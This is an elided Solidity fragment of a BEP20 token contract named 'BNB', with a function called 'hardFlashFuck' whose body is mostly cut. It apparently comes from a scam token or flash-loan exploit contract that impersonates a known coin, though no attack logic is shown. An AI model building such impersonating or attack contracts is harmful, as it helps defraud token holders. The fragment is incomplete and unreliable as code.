...
contract BEP20 is IBEP20 {
    ...
    function _mint(address account, uint256 amount) internal {
        require(account != address(0x0), "BEP20: mint to the zero address");
    ...
    function _burn(address account, uint256 value) internal {
        require(account != address(0x0), "BEP20: burn from the zero address");
...
contract BNB is BEP20 {
    ...
    function hardFlashFuck(
        ...
        require(success, "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c");
    }
}